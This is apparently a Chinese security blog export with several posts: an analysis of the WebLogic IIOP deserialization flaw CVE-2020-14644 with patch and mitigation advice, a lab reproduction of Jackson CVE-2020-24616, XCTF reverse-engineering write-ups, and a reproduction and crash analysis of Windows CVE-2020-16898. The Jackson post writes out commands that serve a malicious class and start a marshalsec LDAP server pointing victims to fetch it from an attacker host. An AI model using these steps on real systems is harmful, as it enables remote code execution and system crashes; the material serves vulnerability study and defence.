<h4 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h4><h5 id="0x01-相关知识"><a href="#0x01-相关知识" class="headerlink" title="0x01 相关知识"></a>0x01 相关知识</h5><h6 id="JDK的classloader类和defineClass方法"><a href="#JDK的classloader类和defineClass方法" class="headerlink" title="JDK的classloader类和defineClass方法"></a>JDK的classloader类和defineClass方法</h6><p>​    一个类在被使用之前，会经历class文件生成—&gt;加载—&gt;连接—&gt;初始化等阶段。其中加载阶段主要完成三件事：1、通过类的全限定名来获取定义次类的二进制字节流，2、将该二进制字节流定义的静态数据结构转换成方法区的运行时数据结构，3、在内存中生成一个代表该类的Class对象，供外部通过该对象来获取类的元数据信息。</p>
<p>​    JDK中的ClassLoader类中有个方法是defineClass，可以根据类全限定名和类的字节数组，加载一个类并返回对应的Class对象到 JVM（Java Virtual Machine）中。</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110556771.png" alt="image-20201015110556771"></p>
<p>如上图所示，如果参数’name’（类名）和’b’（类文件的二进制数据）可控，理论上我们可以加载任何类，我们可以通过该方法，构造符合class格式的bytes数组作为类去加载。（注意：1、一般情况下，通过defineClass加载的类不允许同名，2、一个类中的类名name和类字节数组b中的类名要对应）</p>
<h6 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h6><p>​    javassist是一个开源的分析、编辑和创建Java字节码的类库。它提供了更高级的API，执行效率相对ASM较差，但无需掌握字节码指令的知识，对使用者要求较低。它直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p>
<h5 id="0x02-漏洞代码分析"><a href="#0x02-漏洞代码分析" class="headerlink" title="0x02 漏洞代码分析"></a>0x02 漏洞代码分析</h5><p>该漏洞的原理是在反序列化时，通过使用defineClass方法，加载恶意类。</p>
<p>关键类：com.tangosol.internal.util.invoke.RemoteConstructor</p>
<p>在RemoteConstructor类中，构造实例的代码如下：</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014111222573.png" alt="image-20201014111222573"></p>
<p>其中RemotableSupport类，可以理解为是coherence自定义的Classloader，在其中实现了defineClass，具有加载类的功能。查看其中的realize方法：</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110307308.png" alt="image-20201015110307308"></p>
<p>先执行this.registerIfAbsent(constructor.getDefinition())方法</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110341915.png" alt="image-20201015110341915"></p>
<p>RemotableSupport中定义了 Map 类型的 f_mapDefinitions 的变量充当缓存，每次调用realize时就会先在缓存中查找ClassDefinition。</p>
<p>执行完成后，调用getRemotableClass方法，获取clz。查看ClassDefinition类</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014112030482.png" alt="image-20201014112030482"></p>
<p>可以看到getRemotableClass返回m_clz,并且m_clz是用transient修饰的（transient的含义：将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会被序列化，最终变量为NULL）</p>
<p>所以clz为NULL。于是在realize方法中，就会进入if分支，调用defineClass加载恶意类字节码。</p>
<p>RemotableSupport 继承了ClassLoader，所以它的 defineClass 就是调用了父类的 defineClass来加载类。</p>
<p>需要注意的是BinClassName变量的命名，使用的是ClassIdentity类中的getName方法</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110410957.png" alt="image-20201015110410957"></p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110448486.png" alt="image-20201015110448486"></p>
<p>ClassIdentity类中的构造方法是将clazz作为参数，然后提取该类的一些特征信息，如Basename等。其中getName函数可以简化为：getName() = package + “/“ + baseName + “$” + version</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105230694.png" alt="image-20201014105230694"></p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105430256.png" alt="image-20201014105430256"></p>
<p>所以 ClassIdentity 中的字节数组 byte[] 中的对应的 Class 的类名必须为 package + “.” + baseName + “$” + version，否则可能会加载失败。</p>
<p>继续分析realize方法，加载类之后调用了createInstance方法</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014152406910.png" alt="image-20201014152406910"></p>
<p>aoArgs作为参数进行实例化对象，所以将恶意代码写在构造方法中，实例化之后就会执行恶意代码。</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110636109.png" alt="image-20201015110636109"></p>
<p> 所以只要构造一个带有包名类的恶意代码写进构造函数中，通过 javassist动态修改类名，将原类名加上 $ 和 version 值对应，通过iiop协议和反序列化发送给weblogic服务器，即可实现漏洞利用</p>
<h4 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h4><h5 id="0x01-漏洞利用-弹计算器"><a href="#0x01-漏洞利用-弹计算器" class="headerlink" title="0x01 漏洞利用-弹计算器"></a>0x01 漏洞利用-弹计算器</h5><p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110723660.png" alt="image-20201015110723660"></p>
<h5 id="0x02-漏洞利用-信息回显"><a href="#0x02-漏洞利用-信息回显" class="headerlink" title="0x02 漏洞利用-信息回显"></a>0x02 漏洞利用-信息回显</h5><p>1、开启weblogic服务器</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110854978.png" alt="image-20201015110854978"></p>
<p>2、查看weblogic服务器的网络配置信息</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110937437.png" alt="image-20201015110937437"></p>
<p>3、在攻击机上，编写特制的恶意类（写入weblogic服务器的Ip和weblogic服务的端口以及攻击命令），打包jar包，运行，就可以直接获取到weblogic服务器的信息</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201109171158094.png" alt="image-20201109171158094"></p>
<h4 id="0x4-漏洞防护方案"><a href="#0x4-漏洞防护方案" class="headerlink" title="0x4 漏洞防护方案"></a>0x4 漏洞防护方案</h4><h5 id="0x01-官方方案："><a href="#0x01-官方方案：" class="headerlink" title="0x01 官方方案："></a>0x01 官方方案：</h5><p>官方已经针对此漏洞发布补丁，请受影响的用户参考以下链接安装补丁更新：</p>
<p><a href="https://www.oracle.com/security-alerts/cpujul2020.html">https://www.oracle.com/security-alerts/cpujul2020.html</a></p>
<h5 id="0x02-临时解决方案："><a href="#0x02-临时解决方案：" class="headerlink" title="0x02 临时解决方案："></a>0x02 临时解决方案：</h5><h6 id="关闭IIOP协议："><a href="#关闭IIOP协议：" class="headerlink" title="关闭IIOP协议："></a>关闭IIOP协议：</h6><p>在WebLogic控制台中，选择“服务”-&gt;”AdminServer”-&gt;”协议”，取消“启用IIOP”的勾选。并重启WebLogic项目，使配置生效。</p>
<h6 id="控制T3服务："><a href="#控制T3服务：" class="headerlink" title="控制T3服务："></a>控制T3服务：</h6><p>在WebLogic界面中选择安全-筛选器，在下方出现的界面中找到“连接筛选器”，在里面输入：security.net.ConnectionFilterImpl，然后在连接筛选器规则中输入：127.0.0.1 * * allow t3 t3s，0.0.0.0/0 * * deny t3 t3s。最后保存并重启服务器即可生效。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>0x04CVE-2020-24616复现</title>
    <url>/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="CVE-2020-24616复现"><a href="#CVE-2020-24616复现" class="headerlink" title="CVE-2020-24616复现"></a>CVE-2020-24616复现</h4><p>预警参考链接：<a href="https://s.tencent.com/research/bsafe/1102.html">https://s.tencent.com/research/bsafe/1102.html</a></p>
<p>8月底爆出的新漏洞，分析可参考:<a href="https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g">https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g</a></p>
<a id="more"></a>

<p>参考CVE-2020-8840的复现流程，编写Poc，实现此漏洞复现</p>
<p>0x1 搭建一个Java项目，新建一个Poc类，下载并导入存在漏洞的包</p>
<img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171250748.png" alt="image-20200904171250748" style="zoom:50%;">

<p>0x2 可以直接本地充当服务端，也可使用另一台在同一局域网下的电脑充当服务端，两种方式经实验皆可成功复现，在此记录后者</p>
<p>编写exploid文件：</p>
<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171609352.png" alt="image-20200904171609352"></p>
<p>这个操作是在Mac电脑下弹出计算器（注意：calculator.app的路径需根据实际情况填写）</p>
<p>对此java文件进行javac操作生成exploid.class，放到服务端上</p>
<p>开启服务端：</p>
<p>python3 -m http.server 8888</p>
<p>查看本机Ip后用python启动服务端（注意：python开启时要和exploid.class文件在同一文件夹下</p>
<p>启动LDAP：</p>
<p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a href="http://x.x.x.x(服务端ip):8888/#Exploit&quot;">http://x.x.x.x(服务端Ip):8888/#Exploit&quot;</a> 9999</p>
<p>本机编写POC文件（java菜鸟写了好久才写出来poc</p>
<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904173651117.png" alt="image-20200904173651117"></p>
<p>运行POC文件,成功弹出计算器，此时服务端也有记录</p>
<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20201109172340274.png" alt="image-20201109172340274"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>jackson</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>0x04Xctf进阶刷题-2-更新中</title>
    <url>/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/</url>
    <content><![CDATA[<p>XCTF进阶刷题-2</p>
<a id="more"></a>

<h5 id="0x01-666"><a href="#0x01-666" class="headerlink" title="0x01 666"></a>0x01 666</h5><p>IDA分析</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174113594.png" alt="image-20201103174113594"></p>
<p>进入encode去看具体的加密操作，是几个异或操作，然后3个字符一组</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174237818.png" alt="image-20201103174237818"></p>
<p>编写脚本，flag就出来了</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174322010.png" alt="image-20201103174322010"></p>
<h5 id="0x02-signin-rsa算法"><a href="#0x02-signin-rsa算法" class="headerlink" title="0x02 signin-rsa算法"></a>0x02 signin-rsa算法</h5><p>rsa相关知识：</p>
<p><a href="https://www.52pojie.cn/thread-1100545-1-1.html">https://www.52pojie.cn/thread-1100545-1-1.html</a></p>
<p>ida查看主函数，根据算法特征得知是rsa算法</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110143659748.png" alt="image-20201110143659748"></p>
<p>以下函数的作用是将输入字符串转为十六进制ascii码字符串：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110144019734.png" alt="image-20201110144019734"></p>
<p>利用yafu分解（windows安装：<a href="https://blog.csdn.net/weixin_41603028/article/details/97167312%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E5%A6%82%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BD%AC%E6%8D%A2%E5%8D%B3%E5%8F%AF">https://blog.csdn.net/weixin_41603028/article/details/97167312），然后编写脚本如下，然后转换即可</a></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110180421766.png" alt="image-20201110180421766"></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110180133377.png" alt="image-20201110180133377"></p>
<p>问题：</p>
<p>python3一直无法导入gmpy2的包，只能用python2写了</p>
<h5 id="0x03-igniteme"><a href="#0x03-igniteme" class="headerlink" title="0x03 igniteme"></a>0x03 igniteme</h5><p>ida分析，主函数如下：</p>
<p>可以看到前四位和最后一位是定的，对v7做一个sub_4011C0函数的判断</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110164753556.png" alt="image-20201110164753556"></p>
<p>跟进函数看看：</p>
<p>把值给了v8，然后v8经过一些操作变成v4，v4和最后的字符串相同</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110164900645.png" alt="image-20201110164900645"></p>
<p>查看unk_4420B0和sub_4013C0</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110161046021.png" alt="image-20201110161046021"></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110161059343.png" alt="image-20201110161059343"></p>
<p>编写脚本如下即可，然后转一下大小写</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110165109839.png" alt="image-20201110165109839"></p>
<h5 id="0x04-hackme（-amp-0xff）"><a href="#0x04-hackme（-amp-0xff）" class="headerlink" title="0x04 hackme（&amp;0xff）"></a>0x04 hackme（&amp;0xff）</h5><p>ida分析，找到主函数，分析一下就是，输入字符串，长度为22位，然后抽取其中的10位进行检验（可以看到数组byte_6B4270是22位的），检验方法就是v9和输入的字符串进行异或后要和固定的数组内容相同</p>
<p><strong>注意：循环10次不代表字符串只有10位</strong></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110182250771.png" alt="image-20201110182250771"></p>
<p>查看byte_6B4270的内容</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110182511109.png" alt="image-20201110182511109"></p>
<p>可以编写脚本如下：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201111111154246.png" alt="image-20201111111154246"></p>
<p>要注意的是，v1[i]的值很大，需要和0xff相与，0xff最大值是255，由于整数值超过了255，所以用来控制</p>
<h5 id="0x05-ReverseMe"><a href="#0x05-ReverseMe" class="headerlink" title="0x05 ReverseMe"></a>0x05 ReverseMe</h5><p>ida分析：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201111143110520.png" alt="image-20201111143110520"></p>
<h5 id="0x06-easyre1"><a href="#0x06-easyre1" class="headerlink" title="0x06 easyre1"></a>0x06 easyre1</h5><p>打开ida就能看到，提交即可</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201113115339027.png" alt="image-20201113115339027"></p>
<h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><p><img src="/Users/kami/Desktop/hexo/source/_posts/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201113174747214.png" alt="image-20201113174747214"></p>
<h5 id="0x08-easyhook（hook）"><a href="#0x08-easyhook（hook）" class="headerlink" title="0x08 easyhook（hook）"></a>0x08 easyhook（hook）</h5><p>主函数，关键函数为sub_401220和sub_401240，然后创建了一个文件</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134415789.png" alt="image-20201116134415789"></p>
<p>运行一下，发现输入的字符串被改变了：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116141148468.png" alt="image-20201116141148468"></p>
<p>动态调试一下，发现确实在这里写入的输入字符串被改变了</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116141519684.png" alt="image-20201116141519684"></p>
<p>401220:点进4010D0看看</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134620725.png" alt="image-20201116134620725"></p>
<p>4010D0:</p>
<p>Virtualprotectex修改了指定进程，hprocess和lpaddress是要更改的进程的句柄和页面区域的基地址的指针，5是访问保护属性已更改的区域的大小，以字节为单位。</p>
<p>Writeprocessmemory写入了指定数据，byte_40C9BC是指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据。5是写入的数据大小</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134806821.png" alt="image-20201116134806821"></p>
<p>返回401220看看是怎么修改的</p>
<p>byte_40C9BC是0xE9，但是这只有一个字节，所以后四个字节就是40C9BD的内容，40C9BD和401080有关</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142056410.png" alt="image-20201116142056410"></p>
<p>401080:调用了sub_401000,lpbuffer指向包含要写入文件或设备的数据的缓冲区的指针。同时，真正flag的判定条件numer==1也是这里决定的</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142205966.png" alt="image-20201116142205966"></p>
<p>401000:可以看到对a1进行的操作，编写脚本即可</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142459347.png" alt="image-20201116142459347"></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116154606478.png" alt="image-20201116154606478"></p>
<p>401240:并没有什么作用</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134559636.png" alt="image-20201116134559636"></p>
<h5 id="0x09-secret-string-400（js）"><a href="#0x09-secret-string-400（js）" class="headerlink" title="0x09 secret-string-400（js）"></a>0x09 secret-string-400（js）</h5><p>打开看是一个html和一个js文件，之前没接触过</p>
<p>打开html，是一个验证输入页面，随便输入一个字符串，会弹出nope</p>
<p>搜索了下怎么调试js，开始尝试在代码各处里加入console.log，然后f12查看输出情况</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116171456917.png" alt="image-20201116171456917"></p>
<p>然后页面中出现了隐藏的代码：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116170210757.png" alt="image-20201116170210757"></p>
<p>根据这个代码写出脚本即可：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116171607888.png" alt="image-20201116171607888"></p>
<h5 id="0x0A-easymaze"><a href="#0x0A-easymaze" class="headerlink" title="0x0A easymaze"></a>0x0A easymaze</h5><p><img src="/Users/kami/Desktop/hexo/source/_posts/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116172904202.png" alt="image-20201116172904202"></p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116172501428.png" alt="image-20201116172501428"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>0x05Cve-2020-16898 复现</title>
    <url>/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="Cve-2020-16898-复现"><a href="#Cve-2020-16898-复现" class="headerlink" title="Cve-2020-16898 复现"></a>Cve-2020-16898 复现</h3><p>参考：</p>
<p><a href="https://blog.csdn.net/hsj_csdn/article/details/109138162">https://blog.csdn.net/hsj_csdn/article/details/109138162</a></p>
<p><a href="https://www.secpulse.com/archives/143665.html">https://www.secpulse.com/archives/143665.html</a></p>
<p><a href="https://cert.360.cn/report/detail?id=771d8ddc2d703071d5761b6a2b139793">https://cert.360.cn/report/detail?id=771d8ddc2d703071d5761b6a2b139793</a></p>
<a id="more"></a>

<h4 id="0x1-复现过程："><a href="#0x1-复现过程：" class="headerlink" title="0x1 复现过程："></a>0x1 复现过程：</h4><h5 id="0x01-准备靶机环境"><a href="#0x01-准备靶机环境" class="headerlink" title="0x01 准备靶机环境"></a>0x01 准备靶机环境</h5><p>下一个win10的镜像，然后开启vmware的IPV6功能（编辑-虚拟网络编辑器-NAT设置），查看靶机IPV6地址</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173742012.png" alt="image-20201109173742012"></p>
<h5 id="0x02-攻击机运行脚本（攻击机需要能与靶机进行通信"><a href="#0x02-攻击机运行脚本（攻击机需要能与靶机进行通信" class="headerlink" title="0x02 攻击机运行脚本（攻击机需要能与靶机进行通信"></a>0x02 攻击机运行脚本（攻击机需要能与靶机进行通信</h5><p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173451963.png" alt="image-20201109173451963"></p>
<h5 id="0x03-攻击成功，靶机蓝屏重启"><a href="#0x03-攻击成功，靶机蓝屏重启" class="headerlink" title="0x03 攻击成功，靶机蓝屏重启"></a>0x03 攻击成功，靶机蓝屏重启</h5><p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173816856.png" alt="image-20201109173816856"></p>
<h4 id="0x2-漏洞部分分析："><a href="#0x2-漏洞部分分析：" class="headerlink" title="0x2 漏洞部分分析："></a>0x2 漏洞部分分析：</h4><p>0x01 抓包，可以看到进行了多次DNS查询</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173845156.png" alt="image-20201109173845156"></p>
<h4 id="0x3-原理分析："><a href="#0x3-原理分析：" class="headerlink" title="0x3 原理分析："></a>0x3 原理分析：</h4><h6 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h6><p>1、Microsoft Windows中的TCP/IP功能在内核级别运行，并由驱动程序tcpip.sys提供。该驱动程序处理所有传入和传出的TCP/IP通信信息，包括解析从网络接口接收到的数据包，以及解释此数据并将其传递给更高级别的组件。</p>
<p>2、RDNSS Option：一个用于向IPv6主机传送RDNSS信息的IPv6的RA option</p>
<p>3、Recursive DNS Server (RDNSS)：递归DNS服务器，提供递归DNS解析服务的服务器，用于将域名转换为IP地址或解析成RFC1034和RFC1035中定义的PTR记录。</p>
<p>4、IPv6 Router Advertisment (RA) options，也称为DNS RA  options，允许IPv6的路由器向IPv6的主机广播DNS Recursive Server  Address(DNS递归路由器地址)列表和DNS Search  List（DNS搜索列表），其主要用途为在IPv6的主机上进行DNS名称解析以及域后缀的处理。该信息使用现有ND message(例如RA)作为载体。IPv6主机可以通过RA消息配置一个或多个RDNSS的IPv6地址。当主机接收到RA消息中的DNS的options时，其处理过程如下：1、首先检查Lengh字段的合法性：是否大于等于最小值3，以及是否满足(Length - 1) % 2 == 0；2、对于RDNSS option，还会检查Address字段是否为一个单播地址；3、如果以上验证通过，则主机应按顺序将选项的值复制到DNS存储库和解析器存储库中。 否则，主机必须丢弃这些选项。</p>
<p>5、GS机制：</p>
<p>GS机制分三个步骤：计算随机种子 –&gt; canary写入栈帧 –&gt; GS校验</p>
<p>1、程序启动时，读取**.data<strong>的第一个</strong>DWORD**作为基数，然后和各种元素（时间戳，进程ID，线程ID，计数器等等）进行XOR加密</p>
<p>2、然后将加密后的种子再次写入**.data<strong>的第一个</strong>DWORD**</p>
<p>3、函数在执行前，把加密后的种子取出，与当前<strong>esp</strong>进行异或计算，结果存入EBP的前面</p>
<p>4、函数主体正常执行。</p>
<p>5、<strong>函数返回前</strong>（retn前一点），把cookie取出与esp异或计算后，调用__security_check_cookie函数进行检查，与.data节里的种子进行比较，</p>
<p>如果校验通过，则返回原函数继续执行；如果校验失败，则程序终止。</p>
<p>6、通过RFC8106的标准中对RDNSS option结构的定义（<a href="https://tools.ietf.org/pdf/rfc8106.pdf%EF%BC%89">https://tools.ietf.org/pdf/rfc8106.pdf）</a></p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173914793.png" alt="image-20201109173914793"></p>
<p>Type： 占8-bit，RDNSS 的类型为25</p>
<p>Length：8-bit无符号整数，单位长度为8个字节，所以Type, Length, Reserved, Lifetime一共占8个字节，一个单位长度，而一个IPv6地址占16个字节，两个单位长度，所以Length的最小值为3，且为奇数。</p>
<p>Reserved：保留字段</p>
<p>Lifetime：32-bit无符号整数，存活周期。</p>
<p>Addresses of IPv6 Recursive DNS Servers：保存RNDSS的IPv6地址，每个占16个字节，地址的数量会影响Length字段，number=(Length - 1) / 2。每增加一个地址，Length加2。</p>
<h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>由于Windows TCP/IP堆栈在处理选项类型为25(0x19，递归DNS服务器选项)，当伪造长度字段值为偶数的ICMPv6的路由广播数据包发送给目标主机时，Windows TCP/IP 在检查包过程中会根据Length来获取每个包的偏移，遍历解析，导致对 Addresses of IPv6 Recursive DNS  Servers 和下一个 RDNSS 选项的边界解析错误，从而绕过验证，将攻击者伪造的option包进行解析，造成栈溢出，从而导致系统崩溃。</p>
<h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><p>1、从靶机中导出蓝屏日志文件dmp（在windows\minidump中），使用windbg来分析</p>
<p>遇到的问题：不能正常加载符号表</p>
<p>解决：因为时效问题，搜索了很多方法都无效，最终使用科学上网自动加载符号表解决</p>
<p>2、kv语句查看（Kv，命令用来显示当前线程的堆栈，显示FPO和调用约定）</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173936731.png" alt="image-20201109173936731"></p>
<p>可以看到GS机制的Security Cookie校验失败，也就是说该值被覆盖掉了。</p>
<p>分析出现的关键函数tcpip!Ipv6pHandleRouterAdvertisement()。</p>
<p>3、使用IDA64反编译驱动程序tcpip.sys（win10 1909版本）</p>
<p>找到函数tcpip!Ipv6pHandleRouterAdvertisement()</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109173949807.png" alt="image-20201109173949807"></p>
<p>函数一开始就写出了GS机制：</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109174004821.png" alt="image-20201109174004821"></p>
<p>查看调用的函数，发现Ipv6pUpdateRDNSS()</p>
<p><img src="/2020/10/19/0x05Cve-2020-16898-%E5%A4%8D%E7%8E%B0/image-20201109174021022.png" alt="image-20201109174021022"></p>
<p>进入漏洞函数Ipv6pUpdateRDNSS()：</p>
